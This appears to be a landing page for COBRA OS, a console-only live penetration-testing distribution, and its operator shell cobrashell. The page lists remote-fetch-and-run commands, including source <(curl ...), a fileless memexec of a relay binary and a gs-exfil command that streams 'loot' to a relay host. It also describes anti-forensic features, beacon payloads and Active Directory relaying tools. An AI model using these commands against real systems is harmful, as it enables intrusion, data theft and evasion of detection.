01 > what it is

    

      

        
COBRA OS is a live operating system scaffold for authorized penetration
        testing: a Debian trixie minbase core, a tool feed from the Parrot OS
        repositories, a rebranded operator shell forked from THC's hackshell, and a curated operator
        command registry — all wrapped in a red-team cyberpunk console theme.

        
It is deliberately console-only. There is no X server, no Wayland, no display
        manager and no GUI packages anywhere in the image. tmux splits are the dashboard. Web access is a
        text browser summoned deliberately, over gated connections, optionally wrapped in Tor. The result
        is a small, auditable attack surface that boots from USB and leaves nothing behind.

        
One script — chroot-setup.sh — is the single source of truth for the toolset and the
        hardening. It builds both the chroot rootfs and the live ISO, so the system you test is the system
        you ship.

        

          scaffold, not a finished distro. Treat every default — password, tool list,
          firewall rules — as something to review before it touches a network you care about.

02 > capabilities

    


      

        
▲

        
Console-only, on purpose

        
No X11, no Wayland, no DM, no GUI toolkits. A TTY is all you get, and all you need.
        Smaller image, smaller attack surface, nothing to phish.

      


      

        
✕

        
Anti-forensic shell

        
No history anywhere (bash, less, mysql, psql, sqlite, redis), XHOME in
        /dev/shm that auto-destructs on exit, and a tmux that hides on a socket
        tmux ls will never show.

      


      

        
■

        
Default-deny firewall

        
nftables drops inbound and forwarded traffic by default; loopback and established sessions pass,
        ICMPv4/v6 stay alive. Inbound listeners punch deliberate, runtime-only holes.

      


      

        
●

        
Gated internet

        
Nothing touches the network by accident. Every internet-bound helper — downloads, exfil,
        recon lookups, the browser — sits behind cobrashell's xint gate. Loopback stays open
        for local listeners.

      


      

        
◆

        
Tor-ready

        
System tor daemon with SOCKS on 127.0.0.1:9050, torsocks for
        torify links2, proxychains4 for everything else, and
        proxy 9050 to export socks5h env vars for curl & co.

      


      

        
⬡

        
De-THC'd, zero telemetry

        
The hackshell fork was fully audited: upstream's recon calls to ip.thc.org are
        ripped out — engagement targets never leak to third-party infrastructure. Recon and the
        gs-* tools point where YOU say: COBRA_RECON_HOST,
        GS_HOST/GS_PORT (our relay or your own).

      


      

        
▣

        
LUKS persistence

        
Live-boot with noswap persistence on the cmdline: pair the USB with an encrypted
        persistence partition and live-boot unlocks it at boot. RAM-only semantics stay the default.

      


      

        
≡

        
One source of truth

        
chroot-setup.sh runs inside the debootstrap chroot and as the live-build
        hook — one toolset, one hardening pass, two outputs: ./rootfs/ and
        cobra-os-<date>.iso.

      


      

        
✦

        
Themed boot-to-shell

        
Cobra splash on the BIOS and UEFI boot menus, a red ASCII banner on the login prompt, a remapped
        16-color VGA console palette, themed LS_COLORS, grep and man pages — all escape
        sequences, zero packages.

+ cobrashell, underneath

      
The registry rides on top of cobrashell (THC hackshell fork):
      loot/lootmore for target situational awareness, scan,
      xssh, bounce, ghostip, hide,
      memexec, enc/dec, xtmux on a hidden socket,
      paste-site exfil via transfer/tb, and the gs-* gsocket

      GS_HOST/GS_PORT: rendezvous on our relay or your own,
      never someone else's. Off-OS, the same shell loads straight from this site —
      see cobrashell, anywhere.

    

  







  

    
04 > cobrashell, anywhere

    
Not booted into COBRA OS? The operator shell is mirrored on this site — pull it
    onto any Linux box (HTB, VulnHub, a jumped host) and the toolkit comes with you. Same file the OS
    sources at /etc/cobra/cobrashell.sh, served byte-for-byte from this repo.

    

      

        
1 load it

        
# straight into your running bash:
source <(curl -fsSL https://cobra-os.com/shell/cobrashell.sh)

# or the short URL (same file):
source <(curl -fsSL https://cobra-os.com/cobrashell.sh)

# no curl? wget works too:
source <(wget -qO- https://cobra-os.com/shell/cobrashell.sh)

        
Nothing is written to disk — XHOME still lives in /dev/shm and
        auto-destructs on exit, history still goes to /dev/null, and the xint
        gate still stands between the box and the internet.

      

      

        
2 grab the helpers

        
# the vendored tools cobrashell calls are mirrored too:
curl -fsSLO https://cobra-os.com/shell/ghostip.sh
curl -fsSLO https://cobra-os.com/shell/whatserver.sh
curl -fsSLO https://cobra-os.com/shell/mkegg.sh
curl -fsSLO https://cobra-os.com/shell/linpeas.sh

# then the usual:
xint                # allow internet egress
bin gs-netcat       # pulled from OUR infra (next section)

        
On COBRA OS these live at /etc/cobra/ and need no network. Everywhere else, fetch
        what you need — deliberate, operator-summoned, over HTTPS from this domain only.

      

    

    

      trust the path: the mirror deploys from this repo with the site — and the
      curl-pipe-bash rule still applies: read it first
      (curl -fsSL https://cobra-os.com/shell/cobrashell.sh | less), then load it.
    

  







  

    
05 > gsocket — from our infra

    
cobrashell's gs-* toolset (gs-netcat, gs-sftp, gs-exfil) rendezvous
    through a relay: both ends connect outbound, streams are end-to-end encrypted (SRP), and the
    relay only ever sees ciphertext. COBRA runs its own corner of that network — the binaries and the
    relay come from infrastructure we control, not THC's.

    

      

        
1 binaries from cobra-os.com

        
# inside cobrashell, on any box:
xint
bin gs-netcat     # → dl.cobra-os.com/bin/gs-netcat_linux-x86_64

# or directly / fileless:
curl -fsSLO https://dl.cobra-os.com/bin/gs-netcat_linux-x86_64
memexec https://dl.cobra-os.com/bin/gs-netcat_linux-x86_64

        
Static upstream builds, mirrored byte-for-byte with .sha256 sidecars on the same
        R2 bucket that ships the ISOs. No GitHub rate limits, no third-party fetch path mid-op.

      

      

        
2 rendezvous on our relay

        
# point the gs-* tools at the COBRA relay:
export GS_HOST=relay.cobra-os.com
export GS_PORT=7350
xint

gs-sftp-server            # browse/pull files off a target
gs-exfil loot.tar.gz      # stream loot home
# the egg wizard's gs-netcat beacon mode threads
# GS_HOST/GS_PORT into the payload too

        
A small VPS we control — spinning up alongside a .onion address for Tor access.
        Until it's live, the tools default to the public relay network and need no env vars. Want full
        independence either way? Run your own —
        docker run -d -p 7350:7350 hackerschoice/gsocket-relay.

      

    

    

      why bother: the stream is end-to-end encrypted on any relay — whose relay you use
      decides who sees connection metadata (timing, volume, pairings), and a burned public relay can
      never take your access with it. Same pattern for recon: COBRA_RECON_HOST points
      sub/ptr at your own service (upstream's ip.thc.org calls
      are ripped out). All of it stays behind the xint gate.
    

  







  

    
06 > build profiles

    
The core stays narrow. Extras ride in as space-separated
    COBRA_PROFILES at build time — each one a case in chroot-setup.sh, never
    part of the core list.

    

      

        
[ wireless ]

        
bettercap · hcxtools · hcxdumptool · reaver · bully · kismet

        
802.11 auditing beyond the aircrack-ng base — every UI a console citizen.

      

      

        
[ ad ]

        
impacket · responder · netexec · bloodhound.py

        
Active Directory & Windows ops: coercion, relaying, enumeration, collection.

      

      

        
[ exploit ]

        
metasploit-framework

        
msfconsole is a TTY native. The local exploit-db archive (searchsploit →
        sploit) is core — this profile is just the framework.

      

      

        
[ webplus ]

        
mitmproxy · ffuf · seclists · wpscan · php-cli

        
Heavier web tooling. mitmproxy replaces Burp (Java GUIs are dead weight without X);
        php-cli powers the upserv loot-drop server.

      

    

  







  

    
07 > hardened by default

    

      
    
        
  • root locked (passwd -l) — sudo-only via the operator user, password change forced on first login
    • 
        
  • nftables default-deny input/forward; loopback + established allowed; ICMPv4/v6 kept alive (NDP needs it)
    • 
        
  • sysctl kptr/dmesg/BPF/kexec restrictions, fs.protected_*, IPv4/IPv6 sanity, ip_forward=0
    • 
        
  • modprobe usb-storage off by default; legacy protocols & filesystems blacklisted
    • 
      

      
    
        
  • history to /dev/null for bash/less/mysql/psql/sqlite/redis — plus cobrashell's RAM-only XHOME
    • 
        
  • MAC random Wi-Fi MAC per connection, stable ethernet MAC (NetworkManager)
    • 
        
  • apt no .deb cache in images; docs/man/info stripped; apt lists dropped
    • 
        
  • purge retired TUI artifacts and the whole X11/GUI package set are purged from warm chroots on rebuild
    • 
      

    

  







  

    
08 > build it yourself

    
Two host-side scripts do everything. debootstrap wants root, so run them on a
    Debian/Ubuntu host or VM.

    

      

        
1 rootfs

        
# core toolset
sudo apt install debootstrap
sudo ./build-rootfs.sh

# with extras
sudo COBRA_PROFILES="wireless exploit" ./build-rootfs.sh

# resume on a warm rootfs
sudo SKIP_DEBOOTSTRAP=1 ./build-rootfs.sh

        
Produces ./rootfs/: minimal Debian base + Parrot repo, the curated core tool set,
        locked root, the operator sudo user, default-deny nftables, sysctl/modprobe
        hardening, MAC randomization, history-off defaults.

      

      

        
2 live iso

        
# core toolset ISO
sudo apt install live-build
sudo ./build-iso.sh

# with extras
sudo COBRA_PROFILES="wireless" ./build-iso.sh

# smoke test
qemu-system-x86_64 -m 2G -cdrom cobra-os-*.iso

        
Produces cobra-os-<date>.iso (+ .sha256): iso-hybrid for BIOS
        and UEFI, live-boot with noswap persistence, LUKS persistence unlock via
        cryptsetup, themed boot menus. toram stays a deliberate TAB-edit at the boot menu.
